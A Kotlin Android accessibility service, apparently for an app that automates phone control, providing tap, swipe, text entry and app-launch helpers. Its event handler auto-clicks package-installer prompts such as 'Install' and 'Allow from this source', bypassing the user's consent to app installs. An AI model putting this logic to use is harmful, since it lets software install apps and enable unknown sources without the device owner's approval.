package com.phoneaios.app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.content.Intent
import android.util.Log

class PhoneControlService : AccessibilityService() {

    companion object {
        private const val TAG = "PhoneControlService"
        var instance: PhoneControlService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "Service Connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Auto-install logic: Monitor PackageInstaller
        val packageName = event.packageName?.toString() ?: ""
        if (packageName.contains("packageinstaller")) {
            autoClickInstall(event)
        }
    }

    private fun autoClickInstall(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        val keywords = listOf(
            "Install", "Update", "Next", "Accept", "Open", 
            "Allow", "Settings", "Allow from this source", "Done"
        )
        
        searchAndClick(rootNode, keywords)
    }

    private fun searchAndClick(node: AccessibilityNodeInfo, keywords: List<String>) {
        val text = node.text?.toString() ?: ""
        val contentDesc = node.contentDescription?.toString() ?: ""
        
        if (keywords.any { text.contains(it, ignoreCase = true) || contentDesc.contains(it, ignoreCase = true) }) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d(TAG, "Auto-clicked node: $text / $contentDesc")
                return
            } else if (node.parent?.isClickable == true) {
                node.parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d(TAG, "Auto-clicked parent of: $text / $contentDesc")
                return
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            searchAndClick(child, keywords)
            child.recycle()
        }
    }

    fun tap(x: Float, y: Float) {
        val path = Path()
        path.moveTo(x, y)
        val builder = GestureDescription.Builder()
        builder.addStroke(GestureDescription.StrokeDescription(path, 0, 100))
        dispatchGesture(builder.build(), null, null)
    }

    fun swipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long) {
        val path = Path()
        path.moveTo(startX, startY)
        path.lineTo(endX, endY)
        val builder = GestureDescription.Builder()
        builder.addStroke(GestureDescription.StrokeDescription(path, 0, duration))
        dispatchGesture(builder.build(), null, null)
    }

    fun clickByText(text: String): Boolean {
        val rootNode = rootInActiveWindow ?: return false
        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
        for (node in nodes) {
            if (node.isClickable || node.parent?.isClickable == true) {
                val target = if (node.isClickable) node else node.parent
                target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
        }
        return false
    }

    fun typeText(text: String): Boolean {
        val rootNode = rootInActiveWindow ?: return false
        val focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return false
        val arguments = android.os.Bundle()
        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        return true
    }

    fun scroll() {
        // Vertical scroll from middle-bottom to middle-top
        val displayMetrics = resources.displayMetrics
        val width = displayMetrics.widthPixels.toFloat()
        val height = displayMetrics.heightPixels.toFloat()
        swipe(width / 2, height * 0.8f, width / 2, height * 0.2f, 500)
    }

    fun openApp(packageName: String) {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    override fun onInterrupt() {
        instance = null
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }
}
